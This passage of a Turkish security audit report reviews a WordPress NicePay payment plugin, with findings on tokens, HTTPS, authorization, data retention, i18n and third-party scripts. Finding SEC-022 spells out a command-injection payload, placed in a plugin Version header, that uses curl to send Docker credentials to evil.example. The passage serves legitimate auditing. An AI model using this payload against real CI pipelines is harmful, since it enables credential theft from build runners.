Bir yönetici hesabı ele geçirilmiş veya kötü niyetli bir tarayıcı eklentisi `nicepay_save_shortcode` isteğine `buyer_email[]=a&buyer_email[]=b` ekliyor. `wp_unslash` diziyi geri döndürür, `sanitize_email( array )` PHP 8.1'de `strlen(): Argument #1 ($string) must be of type string, array given` TypeError'ı fırlatır; admin-ajax 500 döner, shortcode kaydedilemez ve sunucu error log'una tam yol bilgisi içeren bir stack trace düşer. İkinci yol: bir migrasyon/import aracı `nicepay_saved_shortcodes` içindeki `button_color` alanını dizi olarak yazarsa, shortcode'u içeren *herkese açık* sayfa `sanitize_hex_color()` üzerinde fatal verir.

**Etki**

İstismar için `manage_options` yetkisi ve geçerli bir nonce gerektiği için doğrudan bir güvenlik zafiyeti değil; ancak yönetici AJAX'ında ölümcül hata (HTTP 500) üretir, PHP fatal error log'una stack trace yazar ve bir eklenti/aktarım tarafından bozulmuş `nicepay_saved_shortcodes` option'ı halka açık shortcode sayfasında ölümcül hataya dönüşebilir (bu ikinci yol kimlik doğrulaması gerektirmez). Kod tabanının geri kalanının tip-katı olması yanında tutarsız bir boşluk.

**Öneri**

Her iki çağrının önüne `is_string()` guard'ı koyun ve `nicepay_get_all_shortcodes()`'un filtresini tüm string alanları kapsayacak şekilde genişletin:
```php
$raw_email    = isset( $_POST['buyer_email'] ) ? wp_unslash( $_POST['buyer_email'] ) : '';
$buyer_email  = is_string( $raw_email ) ? sanitize_email( $raw_email ) : '';

$raw_color    = isset( $_POST['button_color'] ) ? wp_unslash( $_POST['button_color'] ) : '';
$button_color = is_string( $raw_color ) ? sanitize_hex_color( $raw_color ) : '';
$button_color = $button_color ? $button_color : '#2563eb';
```
ve `nicepay_get_all_shortcodes()` filtresine:
```php
foreach ( array( 'name','goods_name','buyer_name','buyer_email','buyer_tel','button_text','button_class','button_color','currency','language','display_mode','pay_method','goods_class' ) as $key ) {
    if ( isset( $shortcode[ $key ] ) && ! is_string( $shortcode[ $key ] ) ) { return false; }
}
```

---

### SEC-007 — Standalone makbuz bearer token'ı süresiz, iptal edilemez ve URL/e-posta üzerinden taşınıyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | session-management / information-disclosure |
| **Konum** | [includes/nicepay-functions.php:1052](../../../includes/nicepay-functions.php#L1052) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
Token üretiliyor ve URL'ye gömülüyor:
```php
$token = bin2hex( random_bytes( 32 ) );                                     // :1059
nicepay_update_transaction( $transaction_id, array(
    'receipt_token_hash' => hash( 'sha256', $token ),
    'receipt_issued_at'  => gmdate( 'Y-m-d H:i:s' ), ), true );             // :1065-1072
return array( 'token' => $token, 'url' => add_query_arg( 'nicepay_receipt', $token, home_url( '/' ) ) ); // :1077-1080
```
Çözümleme sorgusunda `receipt_issued_at` hiç kullanılmıyor — süre kontrolü yok, iptal mekanizması yok:
```php
WHERE receipt_token_hash = %s AND flow = 'standalone'
  AND status IN ('paid', 'partially_refunded', 'refunded')   // :1101-1102
```
Token ayrıca düz metin e-postayla gönderiliyor (`nicepay_send_standalone_receipt_email`, :1152-1172). Olumlu tarafta: yalnız hash saklanıyor, `Referrer-Policy: no-referrer` ve `nocache_headers()` uygulanıyor (main:375-380) ve gösterilen alanlar PII içermiyor (TID/Moid/tutar/yöntem).
````

**Başarısızlık senaryosu**

Alıcı, makbuz e-postasını iş yerindeki paylaşılan bir bilgisayardan açar. `https://shop.example/?nicepay_receipt=<64 hex>` adresi tarayıcı geçmişine ve şirketin HTTP proxy log'una yazılır. Altı ay sonra proxy log'larını inceleyen bir başka çalışan URL'yi kopyalayıp açar ve alıcının ödeme referansı, tutarı ve TID'ini görür. Merchant'ın bu linki iptal edebileceği hiçbir arayüz yoktur.

**Etki**

Entropi (256 bit) tahmin saldırılarını dışlıyor, ama token URL'de olduğu için sunucu erişim log'larına, tarayıcı geçmişine, paylaşılan cihazlarda otomatik tamamlamaya ve e-posta arşivlerine kalıcı olarak düşüyor. Süre veya iptal olmadığı için bu izlerden birine erişen biri yıllar sonra bile makbuzu açabilir. `NicePay_Privacy::erase()` (privacy:141-146) `receipt_token_hash = ''` yaparak token'ı geçersizleştiriyor — yani bir iptal yolu var ama yalnız GDPR silme akışıyla ve merchant için erişilebilir bir "makbuz linkini iptal et" kontrolü yok.

**Öneri**

Token'a makul bir geçerlilik süresi ekleyin (`receipt_issued_at` sütunu zaten var) ve süreyi sorguya dahil edin:
```php
WHERE receipt_token_hash = %s AND flow = 'standalone'
  AND status IN ('paid','partially_refunded','refunded')
  AND receipt_issued_at IS NOT NULL
  AND receipt_issued_at > (UTC_TIMESTAMP() - INTERVAL 90 DAY)
```
Admin işlem detay ekranına "Makbuz linkini iptal et" düğmesi ekleyin (`receipt_token_hash = ''` yazan, capability+nonce korumalı bir aksiyon). E-postada token'ı doğrudan URL'ye koymak yerine kısa ömürlü bir yönlendirme kullanmayı değerlendirin. Makbuz yanıtına `Cache-Control: no-store` yanında `X-Content-Type-Options: nosniff` başlığını da ekleyin (CSV export'ta var, HTML sonuç sayfalarında yok).

---

### SEC-008 — `NicePay_Transactions` AJAX/admin-post hook'larını kurucusunda kaydediyor ve sınıf sayfa render'ında ikinci kez örnekleniyor — çift kayıt riski

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | hook-hygiene |
| **Konum** | [admin/class-nicepay-transactions.php:23](../../../admin/class-nicepay-transactions.php#L23) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
Kurucu hook kaydediyor:
```php
public function __construct() {
    add_action( 'wp_ajax_nicepay_cancel_transaction', array( $this, 'ajax_cancel_transaction' ) );   // :24
    add_action( 'admin_post_nicepay_export_transactions', array( $this, 'handle_csv_export' ) );      // :25
}
```
Sınıf dosya kapsamında bir kez örnekleniyor (`new NicePay_Transactions();` :1030) ve **her işlem sayfası render'ında bir kez daha**:
```php
public function render_transactions_page() {
    $transactions_page = new NicePay_Transactions();   // admin.php:1115
    $transactions_page->render();
}
```
WordPress hook kimliğini `spl_object_hash` ile ürettiği için iki farklı örnek aynı hook'a iki ayrı callback olarak kaydolur.
````

**Başarısızlık senaryosu**

Bir sonraki sürümde işlem listesi AJAX ile yenilenecek şekilde değiştirilir ve `render_transactions_page()` bir `wp_ajax_nicepay_refresh_transactions` handler'ından çağrılır. Aynı istekte `new NicePay_Transactions()` çalışır ve `wp_ajax_nicepay_cancel_transaction` hook'una ikinci bir callback ekler; sonraki iade isteğinde handler iki kez koşar, ikinci koşuş `wc_create_refund()`'u tekrar çağırır ve WooCommerce tarafında ikinci bir refund kaydı oluşur (NICEPAY tarafında CAS engellese bile Woo defteri ile ledger arasında kalıcı tutarsızlık doğar).

**Etki**

Bugün sömürülebilir değil: `render_transactions_page()` yalnız `admin.php?page=nicepay-transactions` isteğinde çalışıyor, `wp_ajax_*` ve `admin_post_*` ise ayrı isteklerde tetikleniyor — dolayısıyla aynı istekte hem kayıt hem tetikleme olmuyor. Ancak bu, gelecekte bir refactor (ör. admin sayfasını AJAX ile parça parça render etmek, veya `admin_post` handler'ı bir sayfa render'ı içinden çağırmak) `handle_csv_export()`'un veya para hareketi yapan `ajax_cancel_transaction()`'ın aynı istekte iki kez çalışmasına yol açabilecek gizli bir kırılganlık. `ajax_cancel_transaction` içindeki `nicepay_claim_transaction_for_refund()` CAS'i çift iadeyi önler, ama bu şans eseri bir savunma.

**Öneri**

Hook kaydını kurucudan ayırın ve tek seferlik bir bootstrap'a taşıyın:
```php
public static function register_hooks() {
    static $registered = false;
    if ( $registered ) { return; }
    $registered = true;
    $instance = new self();
    add_action( 'wp_ajax_nicepay_cancel_transaction', array( $instance, 'ajax_cancel_transaction' ) );
    add_action( 'admin_post_nicepay_export_transactions', array( $instance, 'handle_csv_export' ) );
}
```
Dosya sonundaki `new NicePay_Transactions();` yerine `NicePay_Transactions::register_hooks();` çağırın; `render_transactions_page()` içindeki örnekleme artık yan etkisiz kalır. Aynı düzeltmeyi `admin/class-nicepay-admin.php:1199` (`new NicePay_Admin();`) için de tutarlılık adına uygulayın.

---

### SEC-009 — Return handler ve receipt uç noktalarında HTTPS zorunluluğu yok; ödeme akışının geri kalanı ise HTTPS'i zorunlu tutuyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | transport-security |
| **Konum** | [includes/class-nicepay-return-handler.php:25](../../../includes/class-nicepay-return-handler.php#L25) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
Ödeme başlatmanın her yolunda açık bir HTTPS kapısı var:
```php
if ( function_exists( 'is_ssl' ) && ! is_ssl() ) { return false; }                    // gateway:98-100 (is_available)
if ( function_exists( 'is_ssl' ) && ! is_ssl() ) { wp_send_json_error( ..., 503 ); }  // main:543-546 (ajax_init_payment)
if ( function_exists( 'is_ssl' ) && ! is_ssl() ) { return '<p class="nicepay-error">...'; } // main:417-419 (shortcode)
```
Ancak `AuthToken`, `TxTid` ve `Signature` taşıyan dönüş uç noktalarında aynı kontrol yok — `NicePay_Return_Handler::process()` (:25-39) ve `WC_Gateway_NicePay::handle_return()` (:376-390) yalnız `REQUEST_METHOD === 'POST'` kontrolü yapıyor. `handle_payment_receipt()` (main:369-392) de HTTPS istemiyor.
````

**Başarısızlık senaryosu**

Merchant Let's Encrypt sertifikası yenilenemediği için siteyi geçici olarak HTTP'ye alır. Yeni ödemeler `is_available()` false döndüğü için başlamaz — doğru davranış. Ancak sertifika düşmeden hemen önce başlatılmış, hâlâ `pending` ve süresi dolmamış bir işlem için NICEPAY, tarayıcıyı `http://shop.example/?wc-api=nicepay_return` adresine POST'lar. Aynı Wi-Fi'daki bir dinleyici `AuthToken`, `TxTid` ve `Signature` değerlerini düz metin olarak yakalar ve ödeme sunucu tarafında normal şekilde tamamlanır — kimse bir şeyin yanlış gittiğini fark etmez.

**Etki**

ReturnURL `home_url()`/`WC()->api_request_url()` üzerinden türetildiği için normal koşullarda HTTPS olur; risk yalnızca yanlış yapılandırılmış kurulumlarda (ör. `home_url` http kalmış, ters proxy arkasında `is_ssl()` yanlış negatif, veya merchant sertifikayı geçici olarak kaldırmış) ortaya çıkar. Bu durumda NICEPAY'in tarayıcı POST'u düz metin HTTP üzerinden gider ve `AuthToken` + `TxTid` + `Signature` ağ üzerinde açıkta kalır; makbuz bearer token'ı da düz metin GET'te taşınır. Katmanlı savunma ilkesi gereği ödeme başlatmada uygulanan kural, ödeme *tamamlamada* da uygulanmalı.

**Öneri**

Her iki dönüş handler'ının başına, POST kontrolüyle aynı yere HTTPS kapısı ekleyin (kullanıcıya nazik bir hata sayfasıyla, sessiz başarısızlıkla değil):
```php
if ( function_exists( 'is_ssl' ) && ! is_ssl() ) {
    nicepay_log( 'NicePay return rejected: insecure transport', null, 'error' );
    wp_die( esc_html__( 'NicePay payments require a secure HTTPS connection.', 'nicepay-payment-gateway' ),
            'NicePay Error', array( 'response' => 400 ) );
}
```
Aynı kontrolü `handle_payment_receipt()` için de uygulayın. Ters proxy senaryolarını kapsamak adına dokümantasyona `FORCE_SSL_ADMIN`/`HTTP_X_FORWARDED_PROTO` yapılandırma notu ekleyin — `nicepay_get_configuration_warnings()` zaten HTTPS durumunu raporluyor, oraya bir uyarı satırı eklemek de faydalı olur.

---

### SEC-018 — Tek kullanımlık AuthToken düz metin olarak ledger'a yazılıyor ve varchar(50) sınırında sessizce kırpılabiliyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | secrets-at-rest |
| **Konum** | [includes/nicepay-functions.php:259](../../../includes/nicepay-functions.php#L259) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
Ters çevirme belirsiz kaldığında token kalıcılaştırılıyor: `'auth_token' => $unknown && isset( $auth_data['AuthToken'] ) ? $auth_data['AuthToken'] : '',` (nicepay-functions.php:259) ve approval hatasında `'auth_token' => $needs_reconciliation ? $auth_token : '',` (class-nicepay-gateway.php:529). Sütun tanımı `'auth_token' => self::COLUMN_VARCHAR_50` yani varchar(50) (schema:71). WordPress wpdb::set_sql_mode() STRICT_TRANS_TABLES ve STRICT_ALL_TABLES modlarını kaldırdığı için 50 bayttan uzun bir AuthToken hata vermeden kırpılarak yazılır. Ayrıca auth-return akışında token her zaman önce yazılıyor (gateway:461-464, return-handler:93-96).
```

**Başarısızlık senaryosu**

NICEPAY onay yanıtı ağ hatasıyla kaybolur, net cancel de doğrulanamaz; kod needs_reconciliation yazıp AuthToken'ı ledger'a koyar. Operatör bir hafta sonra manuel mutabakat için bu token'ı kullanmak ister; token 50 bayttan uzun olduğu için kırpılmış olarak saklanmıştır ve NICEPAY tarafında hiçbir işleme karşılık gelmez. Paralel olarak, aynı süre boyunca geçerli olabilecek bir ödeme kimlik bilgisi düz metin olarak veritabanında ve tüm yedeklerde durmuştur.

**Etki**

AuthToken, PSP nezdinde ödemeyi tamamlamaya veya ters çevirmeye yetecek bir ödeme kimlik bilgisidir. Düz metin saklanması, DB yedeği/staging kopyası/başka bir eklentinin okuma yetkisi gibi ikincil bir sızıntının doğrudan para hareketine dönüşmesi anlamına gelir. Diğer yönden, token 50 bayttan uzunsa saklanan değer sessizce bozulur; mutabakat için tutulduğu iddia edilen kayıt aslında kullanılamaz hale gelir ve operatör bunu ancak manuel iptal denemesi başarısız olunca fark eder.

**Öneri**

AuthToken sütununun genişliğini NICEPAY PG-Web v3 belgesindeki azami uzunluğa göre doğrula ve gerekiyorsa varchar(255) yap; yazmadan önce strlen kontrolü yapıp taşma durumunda hata logla (sessiz kırpma olmasın). Token'ı düz saklamak yerine mutabakat için yalnızca gereken süre boyunca (ör. 24 saat) tut ve bir cron ile temizle; ya da wp_salt tabanlı bir anahtarla şifreleyip sakla. Uzun vadede token yerine yalnızca TID + tutar + zaman damgasını sakla ve mutabakatı merchant konsolu üzerinden yönlendir.

---

### SEC-019 — GDPR silme talebi merchant'ın kayıtlı ödeme formu yapılandırmasını sessizce değiştirebiliyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | privacy-integrity |
| **Konum** | [includes/class-nicepay-privacy.php:173](../../../includes/class-nicepay-privacy.php#L173) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
`private static function erase_saved_offer_contact( $email ) { $shortcodes = get_option( 'nicepay_saved_shortcodes', array() ); ... foreach ( $shortcodes as &$shortcode ) { if ( ... ! hash_equals( strtolower( $email ), strtolower( $shortcode['buyer_email'] ) ) ) { continue; } $shortcode['buyer_name'] = ''; $shortcode['buyer_email'] = ''; $shortcode['buyer_tel'] = ''; $shortcode['is_preset'] = false; unset( $shortcode['preset_version'] ); $changed = true; } ... update_option( 'nicepay_saved_shortcodes', ... ); }` (satır 173-198). Bu, silme talebini yapan kişinin verisi değil, merchant'ın ön-doldurma (prefill) yapılandırmasıdır. Ayrıca is_preset=false yapılması ve preset_version'ın silinmesi, nicepay_localize_preset()'in (nicepay-functions.php:1871-1883) o kaydı bir daha asla yerelleştirmemesine yol açar — geri alınamaz bir yan etki.
```

**Başarısızlık senaryosu**

Merchant, kurumsal bir bağış formu için buyer_email alanına destek@magaza.com adresini ön-doldurma olarak yazar. Aynı adresle daha önce bir test ödemesi yapıldığı için, o adres için bir kişisel veri silme talebi onaylanır. NicePay eraser çalışır; hem ledger satırlarını hem de kayıtlı shortcode yapılandırmasını temizler. Ertesi gün merchant formun artık ön-doldurma yapmadığını ve preset etiketinin çeviri almadığını fark eder; hangi işlemin bunu değiştirdiğine dair hiçbir kayıt yoktur.

**Etki**

Doğrulanmış bir kişisel veri silme talebi, hedeflenmediği hâlde merchant'ın ticari yapılandırmasını değiştiriyor: ön-doldurulmuş alıcı bilgileri siliniyor ve dahili preset kaydı kalıcı olarak sıradan bir yapılandırmaya dönüşüyor. Silinen alanlar geri getirilemiyor, hiçbir denetim kaydı (audit trail) tutulmuyor ve merchant'a bildirim yapılmıyor. Merchant kendi e-posta adresini prefill olarak kullandıysa (yaygın bir senaryo), kendi silme talebi formlarını bozabilir.

**Öneri**

Eraser'ı yalnızca işlem ledger'ıyla sınırla; merchant tarafından yapılandırılmış shortcode alanlarına dokunma. Bunun yerine, bu tür bir eşleşme bulunduğunda WordPress'in 'items_retained' + 'messages' mekanizmasıyla operatöre 'X adlı kayıtlı ödeme yapılandırması bu e-posta adresini içeriyor, manuel gözden geçirin' mesajı döndür. Değişiklik yine de yapılacaksa: is_preset/preset_version alanlarını değiştirme, değişikliği nicepay_log ile 'warning' seviyesinde kaydet ve admin'e kalıcı bir bildirim bırak.

---

### SEC-020 — Yetkilendirme modeli doküman ile uyuşmuyor ve capability filtresinde alt sınır yok

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | authorization |
| **Konum** | [includes/nicepay-functions.php:539](../../../includes/nicepay-functions.php#L539) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
`function nicepay_manage_transactions_capability() { return (string) apply_filters( 'nicepay_manage_transactions_capability', 'manage_woocommerce' ); }` (nicepay-functions.php:539-541) ve `function nicepay_current_user_can_manage_payments() { return current_user_can( 'manage_options' ) || current_user_can( nicepay_manage_transactions_capability() ); }` (a.g.e. 484-486). Bu iki fonksiyon CSV export'u (transactions:242), iade tetiklemeyi (transactions:974) ve menüyü (admin:23, 34) yönetiyor. Filtre dönüş değeri üzerinde hiçbir doğrulama yok: 'read' veya var olmayan bir capability döndüren bir tema/eklenti (veya var olmayan bir cap adı — bu durumda WordPress super admin dışında false döner ama 'read' gibi bir değer herkese açar) ödeme ekranlarını abone seviyesine açar. Buna karşılık docs/ARCHITECTURE.md:401 'Authorization | WordPress manage_options capability for admin actions' diyor.
```

**Başarısızlık senaryosu**

Bir çok-satıcılı (multivendor) eklenti, satıcıların kendi siparişlerini görmesi için nicepay_manage_transactions_capability filtresini 'read' döndürecek şekilde ezer. Bundan sonra sitedeki her kayıtlı kullanıcı NicePay > Transactions ekranını açabilir, tüm müşterilerin adlarını ve tüm işlemleri görebilir, filtreli CSV'yi indirebilir ve ajax_cancel_transaction ile herhangi bir ödemeyi iade ettirebilir — çünkü tek kontrol current_user_can('read')'tir.

**Etki**

Dokümanı okuyan bir merchant veya güvenlik denetçisi, işlem listesini ve iade tetiklemeyi yalnızca site yöneticilerinin yapabileceğini varsayar; gerçekte shop_manager rolü de para hareketi başlatabilir ve filtre ile bu daha da aşağı çekilebilir. Filtrenin alt sınırı olmadığı için üçüncü parti bir eklentinin yanlış kullanımı, kimliği doğrulanmış düşük yetkili bir kullanıcıya tüm alıcı adlarını, TID'leri, tutarları ve iade butonunu açabilir.

**Öneri**

Filtrelenmiş capability'yi bir taban yetkiyle AND'le: `$cap = apply_filters(...); return current_user_can( 'manage_options' ) || ( current_user_can( $cap ) && current_user_can( 'edit_shop_orders' ) );`. Filtre değerini bir allowlist'e (manage_woocommerce, edit_shop_orders, manage_options) kısıtla ve dışındaki değerleri yok sayıp bir kez warning logla. docs/ARCHITECTURE.md:401'i gerçek modeli yansıtacak şekilde düzelt ve README.md:190 ile hizala. Ek olarak, iade gibi yıkıcı işlemler için ayrı ve daha yüksek bir capability (ör. nicepay_refund_payments) tanımlamayı değerlendir.

---

### SEC-021 — uninstall.php yok: kaldırma sonrası canlı merchant key ve alıcı PII'si veritabanında kalıyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | data-retention |
| **Konum** | [nicepay-payment-gateway.php:191](../../../nicepay-payment-gateway.php#L191) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
Kaldırma yolunda hiçbir temizlik yok — deaktivasyon yalnızca cron'ları temizliyor: `private function deactivate_current_site() { wp_clear_scheduled_hook( 'nicepay_expire_pending_transactions' ); wp_clear_scheduled_hook( NicePay_Retention::CRON_HOOK ); flush_rewrite_rules(); }` (satır 191-195). Depo kökünde uninstall.php dosyası yok ve register_uninstall_hook hiç çağrılmıyor (yalnızca activation/deactivation kancaları var, satır 811-819); build-release.sh:58 satırındaki paket dosya listesi de böyle bir dosya içermiyor. Buna karşılık nicepay_live_merchant_key option'ı ve buyer_name/buyer_email/buyer_tel sütunları (schema:81-83) düz metin olarak duruyor.
```

**Başarısızlık senaryosu**

Merchant NICEPAY yerine başka bir ödeme sağlayıcısına geçer ve eklentiyi WordPress panelinden siler. nicepay_live_merchant_key ve nicepay_live_mid option'ları silinmez. Altı ay sonra site bir ajansa devredilir; ajans wp_options'ı incelerken hâlâ geçerli olan canlı merchant key'i bulur. Merchant anahtarın hiç iptal edilmediğini fark etmemiştir.

**Etki**

Merchant eklentiyi kaldırdığında canlı NICEPAY merchant key'i wp_options tablosunda kalıyor. Site devredildiğinde, bir yedekten geri yüklendiğinde veya başka bir eklenti option'ları okuduğunda sır hâlâ oradadır ve merchant onu iptal ettirmesi gerektiğini bilmez. Aynı şekilde alıcı adı/e-posta/telefonu, silinmesi gerektiğine dair hiçbir yönlendirme olmadan kalıcılaşır. Finansal kayıtların korunması bilinçli bir tercih olsa da, kimlik bilgisinin korunması için hiçbir gerekçe yok.

**Öneri**

uninstall.php ekle: en azından nicepay_live_mid, nicepay_live_merchant_key, nicepay_test_merchant_key ve tüm nicepay_rl_* transient'larını koşulsuz sil. Finansal tablolar ve alıcı PII'si için, kaldırmadan önce ayarlar sayfasında açık bir onay kutusu ('Kaldırırken NicePay işlem defterini ve alıcı verilerini de sil') sun ve yalnızca işaretliyse tabloları düşür; işaretli değilse admin'e verinin kaldığını ve nasıl silineceğini anlatan bir not bırak. readme.txt'e kaldırma davranışını yaz. Ayrıca paketlenen her dizine boş bir index.php ekleyerek dizin listelemesini kapat.

---

### SEC-022 — CI: PR içeriğinden türetilen sürüm dizesi doğrudan run bloğuna interpolasyonla giriyor (workflow script injection deseni)

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | supply-chain |
| **Konum** | [.github/workflows/tests.yml:157](../../../.github/workflows/tests.yml#L157) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```yaml
Sürüm PR'ın kendi dosya başlığından regex ile çıkarılıyor: `version="$(node -e "...match(/^\s*\*\s*Version:\s*([^\s]+)/m)...")"` (satır 153) ve ardından shell komutuna doğrudan gömülüyor: `run: bash .github/scripts/build-release.sh "${{ steps.version.outputs.version }}" build/nicepay-payment-gateway.zip` (satır 157). Yakalama grubu ([^\s]+) tırnak, noktalı virgül, $( ) ve backtick karakterlerine izin veriyor; ${{ }} ifadesi shell'e verilmeden ÖNCE metin olarak yerleştirildiği için çift tırnak da kaçırılabiliyor. tests.yml pull_request olayında (satır 5) fork PR'larıyla tetikleniyor. Aynı depodaki diğer iş adımları bu deseni doğru şekilde env: bloğu ile kullanıyor (release.yml:54-56, deploy-wordpress-org.yml:141-144), yani kural biliniyor ama burada uygulanmamış.
```

**Başarısızlık senaryosu**

Saldırgan bir fork'ta nicepay-payment-gateway.php başlığını `* Version: 2.0.0";curl$IFS-s$IFS-d@$HOME/.docker/config.json$IFS''https://evil.example''>/dev/null;"` olacak şekilde değiştirip PR açar. tests.yml çalışır, node regex bu dizeyi boşluk içermediği için tam olarak yakalar, package job'ında ${{ }} interpolasyonu shell'e enjekte edilir ve gömülü komut runner üzerinde çalışır.

**Etki**

Fork'tan gelen bir PR, eklenti başlığındaki Version alanına shell metakarakteri koyarak package job'ının runner'ında keyfi komut çalıştırabilir. Bu iş akışında GITHUB_TOKEN salt-okunur ve zaten test job'ları PR kodunu çalıştırdığı için mevcut yükseltme sınırlı; ancak desen, iş akışına ileride bir secret, bir cache yazma yetkisi veya pull_request_target eklendiği gün doğrudan kritik hâle gelir ve runner cache'i üzerinden diğer job'lara sıçrama riski taşır.

**Öneri**

Depodaki diğer iş akışlarındaki kalıba geç: `env: VERSION: ${{ steps.version.outputs.version }}` tanımla ve run içinde "$VERSION" kullan. Ayrıca sürüm regex'ini sıkılaştır: `([0-9]+\.[0-9]+\.[0-9]+(?:-[0-9A-Za-z.]+)?)` ve eşleşme yoksa job'ı başarısız yap. Aynı doğrulamayı build-release.sh içindeki $1 için de tekrarla (check-version.js zaten çağrılıyor ama shell'e ulaşmadan önce değil).

---

### SEC-010 — `NicePay_Inbound_Validator::error()` çeviri fonksiyonuna değişken geçiriyor — string çıkarımı kırılıyor ve mesajlar çeviri dosyası kontrolüne açılıyor

| | |
|---|---|
| **Severity** | ⚪ Bilgi |
| **Kategori** | i18n / defense-in-depth |
| **Konum** | [includes/class-nicepay-inbound-validator.php:297](../../../includes/class-nicepay-inbound-validator.php#L297) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````php
```php
private static function error( $code, $message, $data = '' ) {
    return new WP_Error( $code, __( $message, 'nicepay-payment-gateway' ), $data );   // :297
}
```
Kod tabanının tamamında `__()`/`_e()`/`esc_html__()`'a değişken geçirilen tek yer burası (`grep -rnE '(__|_e|esc_html__|esc_attr__)\(\s*\$[A-Za-z_]'` tek eşleşme veriyor). Bu 12 farklı hata mesajı POT/PO dosyalarına hiç çıkarılamadığı için hiçbir dile çevrilmiyor.
````

**Başarısızlık senaryosu**

Bir sonraki sürümde standalone hata sayfası, tanı kolaylığı için `$transaction->get_error_message()` değerini kullanıcıya göstermeye başlar. Siteye yüklenmiş üçüncü taraf bir `nicepay-payment-gateway-tr_TR.mo` dosyası `Payment transaction was not found.` girdisini yanıltıcı bir metinle (ör. sahte bir destek telefonu) değiştirir; mesaj `esc_html()` ile kaçırıldığı için XSS olmaz ama sosyal mühendislik metni ödeme hata sayfasında görünür. Bugün ise sadece bu 12 mesajın hiçbir dilde çevrilmemiş olması sorun yaratıyor.

**Etki**

Güvenlik etkisi ihmal edilebilir: bu WP_Error nesnelerinin mesajları hiçbir yerde kullanıcıya yankılanmıyor (return handler yalnız `get_error_code()` kullanıyor, gateway ise sabit mesajlar gösteriyor). Yine de, ileride bu mesajlar bir arayüze taşınırsa kötü niyetli/bozuk bir `.mo` dosyası içerik enjekte edebilir; ayrıca WordPress.org Plugin Check bu deseni hata olarak işaretler ve 12 operatör mesajı i18n kapsamı dışında kalır.

**Öneri**

Mesajları çağrı yerinde literal olarak çevirin, `error()` yalnız hazır string alsın:
```php
private static function error( $code, $message, $data = '' ) {
    return new WP_Error( $code, (string) $message, $data );
}
// çağrı yeri:
return self::error( 'nicepay_inbound_replay', __( 'Payment transaction is not pending approval.', 'nicepay-payment-gateway' ) );
```
Ardından `.pot` dosyasını yeniden üretin; `.github/scripts/check-po-placeholders.js` zaten CI'da olduğu için yeni girdiler otomatik doğrulanır.

---

### SEC-023 — Üçüncü parti ödeme penceresi scripti SRI/CSP olmadan, imza ve alıcı PII'si taşıyan sayfaya tam DOM erişimiyle yükleniyor

| | |
|---|---|
| **Severity** | ⚪ Bilgi |
| **Kategori** | third-party-risk |
| **Konum** | [nicepay-payment-gateway.php:489](../../../nicepay-payment-gateway.php#L489) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```php
`wp_enqueue_script( 'nicepay-pgweb', NICEPAY_JS_URL, array(), null, true );` (satır 489-495) — integrity/crossorigin niteliği yok, sürüm null (önbellek denetimi yok) ve NICEPAY_JS_URL sabit bir uzak kaynak: `define( 'NICEPAY_JS_URL', 'https://pg-web.nicepay.co.kr/v3/common/js/nicepay-pgweb.js' );` (satır 29). Bu script, SignData, Moid, Amt, MID ve BuyerName/BuyerTel/BuyerEmail gizli alanlarını taşıyan formun bulunduğu sayfada çalışıyor (templates/payment-form.php:56-65; templates/standalone-payment-form.php:156-176) ve window.nicepayStart / nicepaySubmit üzerinden form gönderimini kontrol ediyor. Eklenti hiçbir Content-Security-Policy önerisi veya dokümantasyonu sunmuyor.
```

**Başarısızlık senaryosu**

NICEPAY'in CDN'i veya alan adı ele geçirilir ve nicepay-pgweb.js'e bir satır eklenir: form gönderilmeden önce BuyerName/BuyerEmail/BuyerTel alanları saldırganın sunucusuna gönderilir. Eklenti tarafında hiçbir bütünlük kontrolü olmadığı için bu değişiklik fark edilmez; sunucu tarafındaki imza doğrulaması bu saldırıyı görmez çünkü ödeme akışı normal şekilde tamamlanır.

**Etki**

pg-web.nicepay.co.kr'nin (veya oraya giden yolun) ele geçirilmesi, ödeme sayfasının tam olarak ele geçirilmesi anlamına gelir: alıcı PII'sinin sızdırılması, form hedefinin değiştirilmesi veya sahte ödeme penceresi gösterilmesi. PG-Web v3 protokolü bu scripti zorunlu kıldığı ve içerik dinamik olduğu için SRI pratikte uygulanamaz; dolayısıyla bu artık bir kabul edilen risk olmalı, ama bugün ne dokümante edilmiş ne de azaltılmış durumda.

**Öneri**

Bunu bilinçli bir kabul edilen risk olarak dokümante et (docs/ARCHITECTURE.md güvenlik katmanları tablosuna satır ekle) ve azaltıcı önlemleri öner: ödeme/receipt sayfaları için script-src'i self + pg-web.nicepay.co.kr ile sınırlayan örnek bir CSP başlığı yayımla; forma yalnızca gerekli alanları koy ve alıcı PII'sini mümkünse sunucuda tut (Moid üzerinden NICEPAY'e sunucu tarafında ilet); wp_enqueue_script'te sürüm parametresi olarak eklenti sürümünü ver ve script yüklenemezse kullanıcıya net bir hata göster (bugün yalnızca genel 'Payment system unavailable' mesajı var, assets/js/nicepay.js:79-85).

---

## Düşmanca doğrulamada elenen iddialar

Yok — bu boyutta hiçbir iddia tümüyle çürütülmedi.

## Kapsam

